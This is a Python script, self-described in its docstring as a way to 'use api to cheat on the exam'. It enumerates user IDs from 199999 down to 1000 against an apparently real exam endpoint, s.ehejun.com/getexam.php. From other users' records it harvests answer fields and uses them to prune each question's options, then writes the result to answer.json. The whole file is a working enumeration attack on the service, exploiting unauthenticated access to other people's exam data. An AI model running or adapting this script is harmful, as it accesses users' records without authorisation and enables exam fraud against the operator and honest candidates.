'''
use api to cheat on the exam
'''
import json
from collections import defaultdict

import requests
import tqdm


def initialization():
    all_options = defaultdict(dict)
    response = requests.get(
        f'http://s.ehejun.com/getexam.php?user_id=192371&exam_type=1410').json(
        )
    for question_payload in response['data']['questions']:
        question_payload = question_payload['question']

        question = question_payload['question']
        A = question_payload['A']
        B = question_payload['B']
        C = question_payload['C']
        D = question_payload['D']

        all_options[question][A['option']] = 1
        all_options[question][B['option']] = 1
        all_options[question][C['option']] = 1
        all_options[question][D['option']] = 1
    return all_options


all_options = initialization()
json.dump(all_options, open('tmp.json', 'w'))

for user_id in tqdm.tqdm(range(199999, 1000, -1)):
    try:
        response = requests.get(
            f'http://s.ehejun.com/getexam.php?user_id={user_id}&exam_type=1410'
        )
    except requests.exceptions.ConnectionError as e:
        continue
    if response.status_code == 200:
        response = response.json()
        if response['code'] == 200:
            print('!!!!!!')
            for question_payload in response['data']['questions']:
                question_payload = question_payload['question']
                if 'answer' in question_payload:
                    question = question_payload['question']
                    answer_option = question_payload['answer']

                    for option in ['A', 'B', 'C', 'D']:
                        if question_payload[option][
                                'ori_order'] == answer_option:
                            answer_string = question_payload[option]['option']
                            del all_options[question][answer_string]

json.dump(all_options, open('answer.json', 'w'))
